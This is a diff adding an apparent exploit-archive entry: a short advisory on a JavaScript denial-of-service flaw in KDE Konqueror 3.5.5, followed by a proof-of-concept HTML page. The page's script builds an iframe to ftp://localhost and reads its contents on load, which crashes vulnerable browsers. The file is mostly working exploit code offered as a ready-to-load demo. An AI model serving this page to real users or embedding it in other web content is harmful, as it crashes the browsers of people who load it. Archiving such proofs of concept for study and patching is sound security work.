@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/22814/info
+
+KDE Konqueror is prone to a remote denial-of-service vulnerability because of an error in KDE's JavaScript implementation.
+
+An attacker may exploit this vulnerability to cause Konquerer to crash, resulting in denial-of-service conditions.
+
+Konqueror included with KDE version 3.5.5 is vulnerable; other versions may also be affected. 
+
+<html>
+<body>
+
+Demo of how to make Konqueror 3.5.5 crash by mark@bindshell.net.<p>
+Simply load this file in Konqueror.  Vulnerable versions should segfault instantly with a null pointer exception.<p>
+<p>
+
+<script>
+read_iframe = function(iframe_name) {
+	var banner = document.getElementById(iframe_name).contentWindow.document.body.innerHTML;
+	alert(banner);
+}
+
+var iframe = document.createElement("IFRAME");
+iframe.setAttribute("src", 'ftp://localhost/anything');
+iframe.setAttribute("name", 'myiframe');
+iframe.setAttribute("id", 'myiframe');
+iframe.setAttribute("onload", 'read_iframe("myiframe")');
+iframe.style.width = "100px";
+iframe.style.height = "100px";
+	
+document.body.appendChild(iframe);
+
+</script>
+</body>
+</html>
